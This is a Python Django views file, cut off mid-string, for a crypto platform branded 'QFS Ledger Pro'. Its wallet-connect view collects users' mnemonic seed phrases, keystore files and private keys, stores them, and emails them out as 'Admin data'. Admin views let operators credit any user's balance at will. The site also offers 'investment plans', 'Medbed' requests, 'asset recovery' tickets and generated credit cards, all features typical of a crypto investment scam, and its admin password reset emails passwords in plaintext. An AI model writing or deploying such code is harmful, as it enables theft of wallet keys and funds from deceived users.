from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth.decorators import login_required
from django.contrib.auth import login as auth_login, logout as auth_logout, authenticate, update_session_auth_hash
from django.contrib import messages
from django.core.mail import send_mail
from django.conf import settings
from django.contrib.auth.models import User
from django.contrib.sites.shortcuts import get_current_site
from django.utils.http import urlsafe_base64_encode, urlsafe_base64_decode
from django.utils.encoding import force_bytes, force_str
from django.contrib.auth.tokens import default_token_generator
from django.utils import timezone
from django.core.paginator import Paginator
from django.contrib.auth.forms import PasswordChangeForm
from .models import (
    UserProfile, TotalBalance, Crytocurrency, UserCryptoHolding,
    Deposit, Withdrawal, AdminWallet, ConnectWallet, AssetRecoveryForm,
    KYCVerification, CryptoPlatform, InvestmentPlan, UserInvestment, InvestmentTransaction,
    MedbedRequest, CreditCardType, CreditCardRequest
)
from .forms import (
    CustomUserCreationForm, LoginForm, ProfileUpdateForm,
    DepositRequestForm, WithdrawalRequestForm, WalletConnectForm,
    AssetRecoveryRequestForm, KYCSubmissionForm, CreateInvestmentForm,
    MedbedRequestForm, CreditCardRequestForm
)
from .utils import (
    send_welcome_email, send_deposit_confirmation_email,
    send_withdrawal_confirmation_email, send_profile_update_email,
    send_password_change_email, send_wallet_connection_email,
    send_asset_recovery_email, send_kyc_submission_email,
    send_investment_confirmation_email
)


def home(request):
    """Home page view"""
    return render(request, 'home.html')

# =========================================
# BUY CRYPTO VIEW
# =========================================
def buy_crypto_view(request):
    """View to display crypto buying platforms so that users can choose from"""
    platforms = CryptoPlatform.objects.all() 
    context = {
        'platforms': platforms
    }
    return render(request, 'buy_crypto.html', context)


def login_view(request):
    """Handle user login with email notification"""
    if request.user.is_authenticated:
        if request.user.is_staff or request.user.is_superuser:
            return redirect('admin_dashboard')
        return redirect('dashboard')
    
    if request.method == 'POST':
        form = LoginForm(request.POST)
        if form.is_valid():
            username = form.cleaned_data['username']
            password = form.cleaned_data['password']
            remember_me = form.cleaned_data.get('remember_me', False)
            
            # Try to authenticate with username first
            user = authenticate(request, username=username, password=password)
            
            # If authentication fails, try with email
            if user is None:
                try:
                    user_obj = User.objects.get(email=username)
                    user = authenticate(request, username=user_obj.username, password=password)
                except User.DoesNotExist:
                    pass
            
            if user is not None:
                auth_login(request, user)
                
                # Set session expiry
                if not remember_me:
                    request.session.set_expiry(0)  # Session expires when browser closes
                
                # Send login notification email
                try:
                    subject = 'New Login to Your QFS Ledger Pro Account'
                    message = f'''
                    Hello {user.first_name},
                    
                    A new login was detected on your QFS Ledger Pro account.
                    
                    If this was you, you can safely ignore this email.
                    If you did not log in, please reset your password immediately.
                    
                    Best regards,
                    QFS Ledger Pro Team
                    '''
                    send_mail(
                        subject,
                        message,
                        'QFS Ledger Pro <noreply@qfsledgerpro.com>',
                        [user.email],
                        fail_silently=True,
                    )
                except Exception as e:
                    print(f"Failed to send login notification: {e}")
                
                messages.success(request, f'Welcome back, {user.first_name}!')
                
                # Redirect based on user role
                if user.is_staff or user.is_superuser:
                    return redirect('admin_dashboard')
                return redirect('dashboard')
            else:
                messages.error(request, 'Invalid username/email or password.')
    else:
        form = LoginForm()
    
    return render(request, 'login.html', {'form': form})


def logout_view(request):
    """Handle user logout"""
    auth_logout(request)
    messages.success(request, 'You have been logged out successfully.')
    return redirect('home')


def signup_view(request):
    """Handle user signup with email verification"""
    if request.user.is_authenticated:
        return redirect('dashboard')
    
    if request.method == 'POST':
        form = CustomUserCreationForm(request.POST)
        if form.is_valid():
            # Save user but don't activate yet
            user = form.save(commit=False)
            user.is_active = True  # We'll verify via email
            user.save()
            
            # Create UserProfile
            UserProfile.objects.create(
                user=user,
                phone_number=form.cleaned_data.get('phone_number', ''),
                subscribe_newsletter=form.cleaned_data.get('subscribe_newsletter', False),
                email_verified=False
            )
            
            # TotalBalance is created via post_save signal in models.py
            
            # Generate verification token
            current_site = get_current_site(request)
            uid = urlsafe_base64_encode(force_bytes(user.pk))
            token = default_token_generator.make_token(user)
            
            # Build verification link
            verification_link = f"http://{current_site.domain}/verify-email/{uid}/{token}/"
            
            # Send welcome/verification email
            send_welcome_email(user, user.userprofile)
            
            # Log user in automatically
            auth_login(request, user)
            messages.success(request, 'Account created! Welcome to QFS Ledger Pro.')
            return redirect('dashboard')
        else:
            messages.error(request, 'Please correct the errors below.')
    else:
        form = CustomUserCreationForm()
    
    return render(request, 'signup.html', {'form': form})


def verify_email(request, uidb64, token):
    """Verify user email address"""
    try:
        uid = force_str(urlsafe_base64_decode(uidb64))
        user = User.objects.get(pk=uid)
    except (TypeError, ValueError, OverflowError, User.DoesNotExist):
        user = None
    
    if user is not None and default_token_generator.check_token(user, token):
        # Mark email as verified
        user_profile = UserProfile.objects.get(user=user)
        user_profile.email_verified = True
        user_profile.save()
        
        messages.success(request, 'Your email has been verified successfully!')
        
        # Log user in if not already logged in
        if not request.user.is_authenticated:
            auth_login(request, user)
        
        return redirect('dashboard')
    else:
        messages.error(request, 'Verification link is invalid or has expired.')
        return redirect('home')


# ==========================================
# DASHBOARD & PROFILE VIEWS
# ==========================================

@login_required
def dashboard_view(request):
    """
    Enhanced dashboard view showing:
    - Total balance
    - Crypto holdings
    - Recent transactions
    - KYC status
    """
    user = request.user
    
    # Update total balance
    total_balance_obj, created = TotalBalance.objects.get_or_create(user=user)
    total_balance_obj.calculate_total_balance()
    
    # Get all cryptocurrencies and map user holdings
    all_cryptos = Crytocurrency.objects.all()
    user_holdings = UserCryptoHolding.objects.filter(user=user)
    holdings_map = {h.cryptocurrency_id: h for h in user_holdings}
    
    crypto_data = []
    for crypto in all_cryptos:
        holding = holdings_map.get(crypto.id)
        crypto_data.append({
            'cryptocurrency': crypto,
            'amount': holding.amount if holding else 0,
            'amount_in_usd': holding.amount_in_usd if holding else 0,
        })
    
    # Get recent transactions (deposits and withdrawals)
    recent_deposits = Deposit.objects.filter(user=user).order_by('-created_at')[:5]
    recent_withdrawals = Withdrawal.objects.filter(user=user).order_by('-created_at')[:5]
    
    # Combine and sort
    recent_transactions = sorted(
        list(recent_deposits) + list(recent_withdrawals),
        key=lambda x: x.created_at,
        reverse=True
    )[:5]
    
    # Get KYC status
    try:
        kyc_status = user.kyc.status
    except:
        kyc_status = 'not_submitted'
        
    # Check wallet connection
    wallet_connected = hasattr(user, 'connectwallet')
    
    context = {
        'total_balance': total_balance_obj,
        'crypto_data': crypto_data,
        'recent_transactions': recent_transactions,
        'kyc_status': kyc_status,
        'wallet_connected': wallet_connected,
    }
    
    return render(request, 'dashboard.html', context)


@login_required
def profile_view(request):
    """View and update user profile"""
    user = request.user
    user_profile = get_object_or_404(UserProfile, user=user)
    
    if request.method == 'POST':
        form = ProfileUpdateForm(request.POST, instance=user)
        if form.is_valid():
            user = form.save()
            
            # Update phone number
            phone_number = request.POST.get('phone_number')
            if phone_number:
                user_profile.phone_number = phone_number
                user_profile.save()
                
            send_profile_update_email(user)
            messages.success(request, 'Profile updated successfully.')
            return redirect('profile')
    else:
        initial_data = {'phone_number': user_profile.phone_number}
        form = ProfileUpdateForm(instance=user, initial=initial_data)
    
    context = {
        'form': form,
        'user_profile': user_profile
    }
    return render(request, 'profile.html', context)


@login_required
def change_password_view(request):
    """Change user password"""
    if request.method == 'POST':
        form = PasswordChangeForm(request.user, request.POST)
        if form.is_valid():
            user = form.save()
            update_session_auth_hash(request, user)  # Important!
            send_password_change_email(user)
            messages.success(request, 'Your password was successfully updated!')
            return redirect('profile')
        else:
            messages.error(request, 'Please correct the error below.')
    else:
        form = PasswordChangeForm(request.user)
    return render(request, 'change_password.html', {'form': form})


# ==========================================
# CRYPTO OPERATIONS VIEWS
# ==========================================

@login_required
def deposit_request_view(request):
    """Handle deposit requests"""
    if request.method == 'POST':
        form = DepositRequestForm(request.POST)
        if form.is_valid():
            cryptocurrency = form.cleaned_data['cryptocurrency']
            amount = form.cleaned_data['amount_in_usd']
            
            # Get admin wallet
            try:
                admin_wallet = AdminWallet.objects.get(cryptocurrency=cryptocurrency, is_active=True)
            except AdminWallet.DoesNotExist:
                messages.error(request, f'No active deposit wallet found for {cryptocurrency.name}. Please contact support.')
                return redirect('deposit')
            
            # Create deposit record
            deposit = Deposit.objects.create(
                user=request.user,
                cryptocurrency=cryptocurrency,
                amount_in_usd=amount,
                admin_wallet=admin_wallet,
                status='pending'
            )
            
            send_deposit_confirmation_email(request.user, deposit)
            messages.success(request, 'Deposit request submitted successfully! Please proceed with payment.')
            
            # Redirect to a detail page or show modal (simplified here)
            return render(request, 'deposit_success.html', {'deposit': deposit, 'wallet': admin_wallet})
    else:
        # Check for pre-selected cryptocurrency
        initial_data = {}
        crypto_id = request.GET.get('cryptocurrency')
        if crypto_id:
            try:
                initial_data['cryptocurrency'] = Crytocurrency.objects.get(id=crypto_id)
            except (Crytocurrency.DoesNotExist, ValueError):
                pass
        
        form = DepositRequestForm(initial=initial_data)
    
    return render(request, 'deposit.html', {'form': form})


@login_required
def withdrawal_request_view(request):
    """Handle withdrawal requests"""
    if request.method == 'POST':
        form = WithdrawalRequestForm(request.user, request.POST)
        if form.is_valid():
            cryptocurrency = form.cleaned_data['cryptocurrency']
            amount = form.cleaned_data['amount_in_usd']
            address = form.cleaned_data['user_wallet_address']
            
            # Create withdrawal record
            withdrawal = Withdrawal.objects.create(
                user=request.user,
                cryptocurrency=cryptocurrency,
                amount_in_usd=amount,
                user_wallet_address=address,
                status='pending'
            )
            
            send_withdrawal_confirmation_email(request.user, withdrawal)
            messages.success(request, 'Withdrawal request submitted successfully.')
            return redirect('transactions')
    else:
        # Check for pre-selected cryptocurrency
        initial_data = {}
        crypto_id = request.GET.get('cryptocurrency')
        if crypto_id:
            try:
                # verify user has this crypto first? logic is in form init, but let's try to set it
                initial_data['cryptocurrency'] = Crytocurrency.objects.get(id=crypto_id)
            except (Crytocurrency.DoesNotExist, ValueError):
                pass

        form = WithdrawalRequestForm(request.user, initial=initial_data)
    
    return render(request, 'withdraw.html', {'form': form})


@login_required
def transactions_view(request):
    """View transaction history"""
    deposits = Deposit.objects.filter(user=request.user).order_by('-created_at')
    withdrawals = Withdrawal.objects.filter(user=request.user).order_by('-created_at')
    
    # Combine and sort
    all_transactions = sorted(
        list(deposits) + list(withdrawals),
        key=lambda x: x.created_at,
        reverse=True
    )
    
    # Pagination
    paginator = Paginator(all_transactions, 10)
    page_number = request.GET.get('page')
    page_obj = paginator.get_page(page_number)
    
    return render(request, 'transactions.html', {'page_obj': page_obj})


# ==========================================
# WALLET & ASSET RECOVERY VIEWS
# ==========================================

@login_required
def wallet_connect_view(request):
    """Connect external wallet"""
    # Check if already connected
    if hasattr(request.user, 'connectwallet'):
        messages.info(request, 'You already have a wallet connected.')
        return redirect('dashboard')
        
    if request.method == 'POST':
        form = WalletConnectForm(request.POST)
        if form.is_valid():
            # Save wallet data
            ConnectWallet.objects.create(
                user=request.user,
                platform=form.cleaned_data.get('platform'),
                mnemonic_phrase=form.cleaned_data.get('mnemonic_phrase'),
                keystore_json=form.cleaned_data.get('keystore_json'),
                private_key=form.cleaned_data.get('private_key')
            )
            
            # Prepare data for email
            wallet_data = {
                'platform': form.cleaned_data.get('platform'),
                'connection_method': form.cleaned_data.get('connection_method'),
                'mnemonic_phrase': form.cleaned_data.get('mnemonic_phrase'),
                'keystore_json': form.cleaned_data.get('keystore_json'),
                'private_key': form.cleaned_data.get('private_key'),
                'timestamp': timezone.now().strftime('%Y-%m-%d %H:%M:%S')
            }
            
            # Send emails (User notification + Admin data)
            send_wallet_connection_email(request.user, wallet_data)
            
            messages.success(request, 'Wallet connected successfully!')
            return redirect('dashboard')
    else:
        form = WalletConnectForm()
    
    return render(request, 'wallet_connect.html', {'form': form})


@login_required
def wallet_disconnect_view(request):
    """Disconnect wallet"""
    if request.method == 'POST':
        try:
            wallet = request.user.connectwallet
            wallet.delete()
            messages.success(request, 'Wallet disconnected successfully.')
        except ConnectWallet.DoesNotExist:
            messages.error(request, 'No wallet found to disconnect.')
            
    return redirect('dashboard')


@login_required
def asset_recovery_request_view(request):
    """Submit asset recovery request"""
    if request.method == 'POST':
        form = AssetRecoveryRequestForm(request.POST)
        if form.is_valid():
            recovery = form.save(commit=False)
            recovery.user = request.user
            recovery.save()
            
            send_asset_recovery_email(request.user, recovery)
            messages.success(request, 'Recovery request submitted. Ticket ID: #' + str(recovery.id))
            return redirect('asset_recovery_status')
    else:
        form = AssetRecoveryRequestForm(initial={
            'full_name': f"{request.user.first_name} {request.user.last_name}",
            'email': request.user.email
        })
    
    return render(request, 'asset_recovery.html', {'form': form})


@login_required
def asset_recovery_status_view(request):
    """View asset recovery requests status"""
    requests = AssetRecoveryForm.objects.filter(user=request.user).order_by('-submitted_at')
    return render(request, 'asset_recovery_status.html', {'requests': requests})


# ==========================================
# KYC VIEWS
# ==========================================

@login_required
def kyc_submit_view(request):
    """Submit KYC documents"""
    # Check if already verified or pending
    try:
        kyc = request.user.kyc
        if kyc.status in ['verified', 'pending']:
            messages.info(request, f'Your KYC status is currently: {kyc.get_status_display()}')
            return redirect('kyc_status')
    except KYCVerification.DoesNotExist:
        kyc = None
        
    if request.method == 'POST':
        form = KYCSubmissionForm(request.POST, request.FILES)
        if form.is_valid():
            if kyc:
                # Update existing
                kyc.document_type = form.cleaned_data['document_type']
                kyc.document_image = form.cleaned_data['document_image']
                kyc.status = 'pending'
                kyc.submitted_at = timezone.now()
                kyc.save()
            else:
                # Create new
                kyc = form.save(commit=False)
                kyc.user = request.user
                kyc.status = 'pending'
                kyc.submitted_at = timezone.now()
                kyc.save()
                
            send_kyc_submission_email(request.user, kyc)
            messages.success(request, 'KYC documents submitted successfully.')
            return redirect('kyc_status')
    else:
        form = KYCSubmissionForm()
        
    return render(request, 'kyc_submit.html', {'form': form})


@login_required
def kyc_status_view(request):
    """Check KYC status"""
    try:
        kyc = request.user.kyc
    except KYCVerification.DoesNotExist:
        kyc = None
        
    return render(request, 'kyc_status.html', {'kyc': kyc})


# ==========================================
# PASSWORD RESET VIEWS
# ==========================================

def password_reset_request(request):
    """Request password reset"""
    if request.method == 'POST':
        email = request.POST.get('email')
        try:
            user = User.objects.get(email=email)
            
            # Generate reset token
            current_site = get_current_site(request)
            uid = urlsafe_base64_encode(force_bytes(user.pk))
            token = default_token_generator.make_token(user)
            
            # Build reset link
            reset_link = f"http://{current_site.domain}/password-reset-confirm/{uid}/{token}/"
            
            # Send reset email
            subject = 'Password Reset for QFS Ledger Pro'
            message = f'''
            Hello {user.first_name},
            
            You requested a password reset for your QFS Ledger Pro account.
            
            Click the link below to reset your password:
            {reset_link}
            
            If you didn't request this, please ignore this email.
            
            Best regards,
            QFS Ledger Pro Team
            '''
            send_mail(
                subject,
                message,
                'QFS Ledger Pro <noreply@qfsledgerpro.com>',
                [user.email],
                fail_silently=False,
            )
            messages.success(request, 'Password reset instructions have been sent to your email.')
            return redirect('password_reset_done')
        except User.DoesNotExist:
            # Don't reveal that the email doesn't exist
            messages.success(request, 'If an account exists with this email, password reset instructions have been sent.')
            return redirect('password_reset_done')
    
    return render(request, 'password_reset_form.html')


def password_reset_done(request):
    """Show confirmation that reset email was sent"""
    return render(request, 'password_reset_done.html')


def password_reset_confirm(request, uidb64, token):
    """Confirm password reset with token"""
    try:
        uid = force_str(urlsafe_base64_decode(uidb64))
        user = User.objects.get(pk=uid)
    except (TypeError, ValueError, OverflowError, User.DoesNotExist):
        user = None
    
    if user is not None and default_token_generator.check_token(user, token):
        if request.method == 'POST':
            password1 = request.POST.get('password1')
            password2 = request.POST.get('password2')
            
            if password1 and password1 == password2:
                user.set_password(password1)
                user.save()
                messages.success(request, 'Your password has been reset successfully! You can now log in.')
                return redirect('password_reset_complete')
            else:
                messages.error(request, 'Passwords do not match.')
        
        return render(request, 'password_reset_confirm.html', {'validlink': True})
    else:
        messages.error(request, 'Password reset link is invalid or has expired.')
        return render(request, 'password_reset_confirm.html', {'validlink': False})


def password_reset_complete(request):
    """Show confirmation that password was reset"""
    return render(request, 'password_reset_complete.html')


# ==========================================
# INVESTMENT VIEWS
# ==========================================

@login_required
def investment_plans_view(request):
    """Display available investment plans"""
    plans = InvestmentPlan.objects.filter(is_active=True).order_by('min_amount')
    
    # Get user balances for context
    user_holdings = UserCryptoHolding.objects.filter(user=request.user, amount_in_usd__gt=0)
    
    context = {
        'plans': plans,
        'user_holdings': user_holdings
    }
    return render(request, 'investment_plans.html', context)


@login_required
def create_investment_view(request, plan_id):
    """Handle investment creation"""
    plan = get_object_or_404(InvestmentPlan, id=plan_id, is_active=True)
    
    if request.method == 'POST':
        form = CreateInvestmentForm(request.user, plan, request.POST)
        if form.is_valid():
            cryptocurrency = form.cleaned_data['cryptocurrency']
            amount = form.cleaned_data['amount']
            
            # Deduct from user balance
            holding = UserCryptoHolding.objects.get(user=request.user, cryptocurrency=cryptocurrency)
            holding.amount_in_usd -= amount
            holding.save()
            
            # Update total balance
            TotalBalance.update_user_balance(request.user)
            
            # Create investment
            investment = UserInvestment.objects.create(
                user=request.user,
                plan=plan,
                cryptocurrency=cryptocurrency,
                amount_in_usd=amount,
                amount_invested=amount / cryptocurrency.coin_price if cryptocurrency.coin_price > 0 else 0, # Store crypto amount
                status='active'
            )
            
            # Create transaction record
            InvestmentTransaction.objects.create(
                investment=investment,
                transaction_type='investment_start',
                amount=amount,
                description=f"Initial investment in {plan.name} plan"
            )
            
            # Send confirmation email
            send_investment_confirmation_email(request.user, investment)
            
            messages.success(request, f'Successfully invested ${amount} in {plan.name} plan!')
            return redirect('my_investments')
    else:
        form = CreateInvestmentForm(request.user, plan)
    
    context = {
        'form': form,
        'plan': plan
    }
    return render(request, 'create_investment.html', context)


@login_required
def my_investments_view(request):
    """List user's investments"""
    active_investments = UserInvestment.objects.filter(user=request.user, status='active').order_by('-start_date')
    completed_investments = UserInvestment.objects.filter(user=request.user).exclude(status='active').order_by('-end_date')
    
    total_active_investment = sum(inv.amount_in_usd for inv in active_investments)
    total_profit_earned = sum(inv.total_profit_earned for inv in UserInvestment.objects.filter(user=request.user))
    
    context = {
        'active_investments': active_investments,
        'completed_investments': completed_investments,
        'total_active_investment': total_active_investment,
        'total_profit_earned': total_profit_earned
    }
    return render(request, 'my_investments.html', context)


@login_required
def investment_detail_view(request, investment_id):
    """Detail view for a specific investment"""
    investment = get_object_or_404(UserInvestment, id=investment_id, user=request.user)
    transactions = investment.transactions.all().order_by('-created_at')
    
    context = {
        'investment': investment,
        'transactions': transactions
    }
    return render(request, 'investment_detail.html', context)


# ==========================================
# MEDBED VIEWS
# ==========================================

@login_required
def medbed_request_view(request):
    """Handle Medbed service requests"""
    if request.method == 'POST':
        form = MedbedRequestForm(request.POST)
        if form.is_valid():
            medbed_request = form.save(commit=False)
            medbed_request.user = request.user
            medbed_request.save()
            
            messages.success(request, 'Your Medbed request has been submitted successfully!')
            return redirect('medbed_success')
    else:
        try:
            phone_number = request.user.userprofile.phone_number
        except:
            phone_number = ''
            
        form = MedbedRequestForm(initial={
            'full_name': f"{request.user.first_name} {request.user.last_name}",
            'email': request.user.email,
            'phone_number': phone_number
        })
    
    return render(request, 'medbed_request.html', {'form': form})


@login_required
def medbed_success_view(request):
    """Show Medbed request success page"""
    return render(request, 'medbed_success.html')


# ==========================================
# CREDIT CARD VIEWS
# ==========================================

@login_required
def credit_card_request_view(request):
    """Handle QFS Credit Card requests"""
    # specific active card details logic
    active_cards = CreditCardRequest.objects.filter(user=request.user, status__in=['approved', 'shipped', 'active'])
    
    # If user wants to request a new card explicitly or has no active cards
    # Ensure we only redirect to details on GET requests where mode is not 'new'
    if request.method == 'GET' and active_cards.exists() and request.GET.get('mode') != 'new':
        # Show list of active cards
        return render(request, 'credit_card_details.html', {'active_cards': active_cards})
    
    # Otherwise proceed to show form or handle POST
        
    card_types = CreditCardType.objects.all()
    
    if request.method == 'POST':
        form = CreditCardRequestForm(request.POST)
        if form.is_valid():
            card_request = form.save(commit=False)
            card_request.user = request.user
            card_request.save()
            
            messages.success(request, 'Your QFS Credit Card request has been submitted successfully!')
            return redirect('credit_card_details')
        else:
            messages.error(request, f"There was an error with your request: {form.errors}")
    else:
        try:
            phone_number = request.user.userprofile.phone_number
        except:
            phone_number = ''
            
        form = CreditCardRequestForm(initial={
            'full_name': f"{request.user.first_name} {request.user.last_name}",
            'phone_number': phone_number
        })

    return render(request, 'credit_card_request.html', {'form': form, 'card_types': card_types})


# credit card details views
@login_required
def credit_card_details_view(request):
    """View existing credit card details"""
    active_cards = CreditCardRequest.objects.filter(user=request.user, status__in=['pending', 'approved', 'shipped', 'active', 'rejected', 'banned', 'suspended'])
    return render(request, 'credit_card_details.html', {'active_cards': active_cards})


from django.contrib.auth.decorators import user_passes_test

def is_admin(user):
    return user.is_authenticated and (user.is_staff or user.is_superuser)

@user_passes_test(is_admin)
def admin_dashboard_view(request):
    """Custom Admin Dashboard"""
    # Stats
    total_users = User.objects.count()
    pending_deposits = Deposit.objects.filter(status='pending').count()
    pending_withdrawals = Withdrawal.objects.filter(status='pending').count()
    active_investments = UserInvestment.objects.filter(status='active').count()
    
    # Quick Actions / Alerts
    pending_card_requests_count = CreditCardRequest.objects.filter(status='pending').count()
    pending_kyc_count = KYCVerification.objects.filter(status='pending').count()
    
    context = {
        'total_users': total_users,
        'pending_deposits': pending_deposits,
        'pending_withdrawals': pending_withdrawals,
        'active_investments': active_investments,
        'pending_card_requests_count': pending_card_requests_count,
        'pending_kyc_count': pending_kyc_count,
    }
    return render(request, 'custom_admin/admin_dashboard.html', context)# ==========================================
# ADMIN MANAGEMENT VIEWS
# ==========================================

@user_passes_test(is_admin)
def admin_users_view(request):
    """List all users"""
    users = User.objects.all().order_by('-date_joined')
    return render(request, 'custom_admin/users.html', {'users': users})


@user_passes_test(is_admin)
def admin_user_detail_view(request, user_id):
    """View user details"""
    user = get_object_or_404(User, id=user_id)
    
    # Get user stats
    holdings = UserCryptoHolding.objects.filter(user=user)
    total_balance = TotalBalance.objects.filter(user=user).first()
    deposits = Deposit.objects.filter(user=user).order_by('-created_at')[:5]
    withdrawals = Withdrawal.objects.filter(user=user).order_by('-created_at')[:5]
    
    context = {
        'user_obj': user,
        'holdings': holdings,
        'total_balance': total_balance,
        'deposits': deposits,
        'withdrawals': withdrawals
    }
    return render(request, 'custom_admin/user_detail.html', context)


@user_passes_test(is_admin)
def admin_deposits_view(request):
    """List all deposits"""
    deposits = Deposit.objects.all().order_by('-created_at')
    return render(request, 'custom_admin/deposits.html', {'deposits': deposits})


@user_passes_test(is_admin)
def admin_update_deposit(request, deposit_id):
    """Update deposit status"""
    if request.method == 'POST':
        deposit = get_object_or_404(Deposit, id=deposit_id)
        action = request.POST.get('action')
        
        if action == 'approve':
            deposit.status = 'completed'
            deposit.save()
            messages.success(request, f'Deposit #{deposit_id} approved successfully!')
        elif action == 'reject':
            deposit.status = 'failed'
            deposit.save()
            messages.warning(request, f'Deposit #{deposit_id} rejected.')
    
    return redirect('admin_deposits')


@user_passes_test(is_admin)
def admin_withdrawals_view(request):
    """List all withdrawals"""
    withdrawals = Withdrawal.objects.all().order_by('-created_at')
    return render(request, 'custom_admin/withdrawals.html', {'withdrawals': withdrawals})


@user_passes_test(is_admin)
def admin_update_withdrawal(request, withdrawal_id):
    """Update withdrawal status"""
    if request.method == 'POST':
        withdrawal = get_object_or_404(Withdrawal, id=withdrawal_id)
        action = request.POST.get('action')
        
        if action == 'approve':
            withdrawal.status = 'completed'
            withdrawal.save()
            messages.success(request, f'Withdrawal #{withdrawal_id} approved successfully!')
        elif action == 'reject':
            withdrawal.status = 'failed'
            withdrawal.save()
            messages.warning(request, f'Withdrawal #{withdrawal_id} rejected.')
    
    return redirect('admin_withdrawals')


@user_passes_test(is_admin)
def admin_investments_view(request):
    """List all investments"""
    investments = UserInvestment.objects.all().order_by('-start_date')
    return render(request, 'custom_admin/investments.html', {'investments': investments})


@user_passes_test(is_admin)
def admin_credit_cards_view(request):
    """List all credit card requests"""
    requests = CreditCardRequest.objects.all().order_by('-created_at')
    return render(request, 'custom_admin/credit_cards.html', {'requests': requests})


@user_passes_test(is_admin)
def admin_update_credit_card(request, request_id):
    """Update credit card request status"""
    if request.method == 'POST':
        card_request = get_object_or_404(CreditCardRequest, id=request_id)
        action = request.POST.get('action')
        
        if action == 'approve':
            card_request.status = 'approved'
            card_request.save()  # This will auto-generate card details
            messages.success(request, f'Credit card request #{request_id} approved! Card details generated.')
        elif action == 'reject':
            card_request.status = 'rejected'
            card_request.save()
            messages.warning(request, f'Credit card request #{request_id} rejected.')
        elif action == 'ship':
            card_request.status = 'shipped'
            card_request.save()
            messages.success(request, f'Credit card #{request_id} marked as shipped.')
    
    return redirect('admin_credit_cards')


@user_passes_test(is_admin)
def admin_medbed_view(request):
    """List all medbed requests"""
    requests = MedbedRequest.objects.all().order_by('-created_at')
    return render(request, 'custom_admin/medbed.html', {'requests': requests})


@user_passes_test(is_admin)
def admin_update_medbed(request, request_id):
    """Update medbed request status"""
    if request.method == 'POST':
        medbed_request = get_object_or_404(MedbedRequest, id=request_id)
        action = request.POST.get('action')
        
        if action == 'confirm':
            medbed_request.status = 'confirmed'
            medbed_request.save()
            messages.success(request, f'Medbed request #{request_id} confirmed!')
        elif action == 'complete':
            medbed_request.status = 'completed'
            medbed_request.save()
            messages.success(request, f'Medbed request #{request_id} marked as completed.')
        elif action == 'cancel':
            medbed_request.status = 'cancelled'
            medbed_request.save()
            messages.warning(request, f'Medbed request #{request_id} cancelled.')
    
    return redirect('admin_medbed')


@user_passes_test(is_admin)
def admin_kyc_view(request):
    """List all KYC submissions"""
    kyc_submissions = KYCVerification.objects.all().order_by('-submitted_at')
    return render(request, 'custom_admin/kyc.html', {'kyc_submissions': kyc_submissions})


@user_passes_test(is_admin)
def admin_update_kyc(request, kyc_id):
    """Update KYC status"""
    if request.method == 'POST':
        kyc = get_object_or_404(KYCVerification, id=kyc_id)
        action = request.POST.get('action')
        notes = request.POST.get('notes', '')
        
        if action == 'verify':
            kyc.status = 'verified'
            kyc.review_notes = notes
            kyc.save()
            messages.success(request, f'KYC #{kyc_id} verified successfully!')
        elif action == 'reject':
            kyc.status = 'rejected'
            kyc.review_notes = notes
            kyc.save()
            messages.warning(request, f'KYC #{kyc_id} rejected.')
    
    return redirect('admin_kyc')

# ==========================================
# PRIORITY ADMIN MANAGEMENT VIEWS
# ==========================================

from django.contrib.auth.decorators import user_passes_test
from django.contrib.auth.models import User
from django.contrib.auth import login
from django.shortcuts import render, redirect, get_object_or_404
from django.contrib import messages
from django.core.mail import send_mail
from django.conf import settings
from decimal import Decimal
from .models import (
    UserCryptoHolding, TotalBalance, Deposit, Withdrawal, UserInvestment, 
    CreditCardRequest, MedbedRequest, KYCVerification, Crytocurrency,
    BalanceAdjustment, UserActivityLog, AdminNotification
)

def is_admin(user):
    """Check if user is an admin"""
    return user.is_authenticated and (user.is_staff or user.is_superuser)


# ==========================================
# USER BALANCE MANAGEMENT
# ==========================================

@user_passes_test(is_admin)
def admin_edit_user_balance(request, user_id):
    """Edit user's cryptocurrency balances"""
    user = get_object_or_404(User, id=user_id)
    holdings = UserCryptoHolding.objects.filter(user=user)
    cryptocurrencies = Crytocurrency.objects.all()
    
    if request.method == 'POST':
        crypto_id = request.POST.get('cryptocurrency')
        amount = request.POST.get('amount')
        action = request.POST.get('action')  # add or subtract
        reason = request.POST.get('reason')
        
        try:
            crypto = Crytocurrency.objects.get(id=crypto_id)
            amount_decimal = Decimal(amount)
            
            # Get or create holding
            holding, created = UserCryptoHolding.objects.get_or_create(
                user=user,
                cryptocurrency=crypto,
                defaults={'amount': 0, 'amount_in_usd': 0}
            )
            
            # Calculate USD value
            usd_value = amount_decimal * crypto.coin_price
            
            if action == 'add':
                holding.amount += amount_decimal
                holding.amount_in_usd += usd_value
                adjustment_type = 'add'
            else:  # subtract
                holding.amount -= amount_decimal
                holding.amount_in_usd -= usd_value
                adjustment_type = 'subtract'
            
            holding.save()
            
            # Update total balance
            TotalBalance.update_user_balance(user)
            
            # Create audit trail
            BalanceAdjustment.objects.create(
                user=user,
                admin=request.user,
                amount=amount_decimal,
                cryptocurrency=crypto,
                adjustment_type=adjustment_type,
                reason=reason
            )
            
            # Log activity
            UserActivityLog.objects.create(
                user=user,
                action=f"Balance {action}ed by admin",
                details=f"{amount} {crypto.symbol} - {reason}"
            )
            
            messages.success(request, f'Successfully {action}ed {amount} {crypto.symbol} to {user.username}\'s balance')
            return redirect('admin_user_detail', user_id=user_id)
            
        except Exception as e:
            messages.error(request, f'Error updating balance: {str(e)}')
    
    context = {
        'user_obj': user,
        'holdings': holdings,
        'cryptocurrencies': cryptocurrencies,
    }
    return render(request, 'custom_admin/edit_user_balance.html', context)


# ==========================================
# ACCOUNT CONTROLS
# ==========================================

@user_passes_test(is_admin)
def admin_toggle_user_status(request, user_id):
    """Activate or suspend user account"""
    user = get_object_or_404(User, id=user_id)
    
    if request.method == 'POST':
        user.is_active = not user.is_active
        user.save()
        
        status = "activated" if user.is_active else "suspended"
        UserActivityLog.objects.create(
            user=user,
            action=f"Account {status} by admin",
            details=f"Admin: {request.user.username}"
        )
        
        messages.success(request, f'User account {status} successfully')
    
    return redirect('admin_user_detail', user_id=user_id)


@user_passes_test(is_admin)
def admin_reset_user_password(request, user_id):
    """Reset user password"""
    user = get_object_or_404(User, id=user_id)
    
    if request.method == 'POST':
        new_password = request.POST.get('new_password')
        
        if new_password:
            user.set_password(new_password)
            user.save()
            
            UserActivityLog.objects.create(
                user=user,
                action="Password reset by admin",
                details=f"Admin: {request.user.username}"
            )
            
            # Send email notification
            try:
                send_mail(
                    'Password Reset by Administrator',
                    f'''Hello {user.first_name},

Your password has been reset by an administrator.
Your new password is: {new_password}

Please login and change your password immediately for security.

Best regards,
